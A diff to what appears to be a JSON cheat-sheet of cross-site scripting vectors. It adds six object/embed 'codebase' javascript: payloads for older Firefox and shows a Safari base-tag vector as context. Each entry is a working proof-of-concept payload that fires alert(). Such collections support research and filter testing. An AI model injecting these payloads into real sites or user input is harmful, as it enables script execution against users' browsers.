@@ -200,5 +200,35 @@
     "description": "Base tag with JavaScript protocol rewriting relative URLS",
     "code": "<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>",
     "browsers": ["safari"]
+  },
+  {
+    "description": "Object data and codebase in Firefox v140 and below",
+    "code": "<object data=# codebase=javascript:alert(document.domain)//>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Embed src and codebase in Firefox v140 and below",
+    "code": "<embed src=# codebase=javascript:alert(document.domain)//>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Object data and codebase with single line comment in Firefox v140 and below",
+    "code": "<object data=\"#\nalert(1)\" codebase=javascript://>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Object data and codebase and hash bang in Firefox v140 and below",
+    "code": "<object data=\"#!\nalert(1)\" codebase=javascript:>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Embed src and codebase with single line comment in Firefox v140 and below",
+    "code": "<embed src=\"#\nalert(1)\" codebase=javascript://>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Embed src and codebase and hash bang in Firefox v140 and below",
+    "code": "<embed src=\"#!\nalert(1)\" codebase=javascript:>",
+    "browsers": ["firefox"]
   }
 ]
